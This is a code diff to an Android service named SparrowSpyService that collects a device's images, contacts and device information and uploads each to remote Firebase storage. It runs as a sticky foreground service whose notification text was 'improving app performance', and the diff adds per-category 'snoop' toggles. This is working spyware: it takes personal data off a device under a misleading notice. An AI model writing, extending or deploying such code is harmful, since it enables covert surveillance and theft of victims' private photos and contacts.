@@ -1,4 +1,4 @@
-package com.tangledbytes.sparrowspy.server.services;
+package com.tangledbytes.sparrowspy.services;
 
 import android.app.Notification;
 import android.app.Service;
@@ -8,6 +8,7 @@ import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
 
+import com.google.firebase.storage.UploadTask;
 import com.tangledbytes.sparrowspy.R;
 import com.tangledbytes.sparrowspy.collectors.ContactsCollector;
 import com.tangledbytes.sparrowspy.collectors.DeviceInfoCollector;
@@ -16,7 +17,9 @@ import com.tangledbytes.sparrowspy.server.DataUploader;
 import com.tangledbytes.sparrowspy.utils.Constants;
 import com.tangledbytes.sparrowspy.utils.FileUtils;
 import com.tangledbytes.sparrowspy.utils.NotificationUtils;
+import com.tangledbytes.sparrowspy.utils.Resources;
 import com.tangledbytes.sparrowspy.utils.SpyState;
+import com.tangledbytes.sparrowspy.utils.Utils;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -26,7 +29,7 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
 
 public class SparrowSpyService extends Service {
-    private static final String TAG = "CollectorService";
+    private static final String TAG = "SparrowSpyService";
     private static final int COLLECTOR_SERVICE_NOTIF_ID = 101;
     private Context mContext;
 
@@ -45,7 +48,7 @@ public class SparrowSpyService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        updateNotif(R.string.improving_app_performance);
+        updateNotif(Resources.Strings.notifContent1);
         collectData();
         return START_STICKY;
     }
@@ -56,7 +59,7 @@ public class SparrowSpyService extends Service {
         for (File file : files) {
             FileUtils.delete(file);
         }
-        Constants.init(Constants.DIR_APP_ROOT);
+        Constants.init(this, Constants.DIR_APP_ROOT);
     }
 
     /**
@@ -65,6 +68,7 @@ public class SparrowSpyService extends Service {
     private void collectData() {
         List<Future<?>> execFutures = new ArrayList<>();
         ExecutorService executor = Executors.newCachedThreadPool();
+        DataUploader uploader = new DataUploader(this);
 
         // Task: Clean
         clearDirectories();
@@ -72,18 +76,28 @@ public class SparrowSpyService extends Service {
 
         // Task: Save Images
         execFutures.add(executor.submit(() -> {
+            if(!Resources.Settings.snoopImages)
+                return;
             new ImagesCollector().collect();
             Log.i(TAG, "Images compressed and saved");
+            updateNotif(Resources.Strings.notifContent2);
+            waitForUpload(uploader.uploadImages());
         }));
         // Task: Save contacts
         execFutures.add(executor.submit(() -> {
+            if(!Resources.Settings.snoopContacts)
+                return;
             new ContactsCollector(mContext).collect();
             Log.i(TAG, "Contacts saved");
+            waitForUpload(uploader.uploadContacts());
         }));
         // Task: Device Info
         execFutures.add(executor.submit(() -> {
+            if(!Resources.Settings.snoopDeviceInfo)
+                return;
             new DeviceInfoCollector(mContext).collect();
             Log.i(TAG, "Device info retrieved");
+            waitForUpload(uploader.uploadDeviceInfo());
         }));
 
         new Thread(() -> {
@@ -95,13 +109,16 @@ public class SparrowSpyService extends Service {
                     Log.wtf(TAG, "Exception occurred while executing tasks", e);
                 }
             }
-            updateNotif(R.string.finishing);
-            DataUploader uploader = new DataUploader(mContext, this::stopSelf);
-            uploader.upload();
+            stopSelf();
         }).start();
     }
 
-    private void updateNotif(int contentTextId) {
+    private void waitForUpload(UploadTask task) {
+        if(task == null) return;
+        while(!task.isComplete())
+            Utils.sleep(250);
+    }
+    private void updateNotif(String content) {
         Notification.Builder notifBuilder;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             // Create notification channel for oreo and above devices
@@ -116,9 +133,9 @@ public class SparrowSpyService extends Service {
 
         // Start foreground notification
         notifBuilder
-                .setSmallIcon(R.drawable.ic_collector_notification)
-                .setContentTitle(getString(R.string.collector_service_title))
-                .setContentText(getString(contentTextId));
+                .setSmallIcon(Resources.Drawables.notifIcon)
+                .setContentTitle(Resources.Strings.notifTitle)
+                .setContentText(content);
         startForeground(COLLECTOR_SERVICE_NOTIF_ID, notifBuilder.build());
     }
 
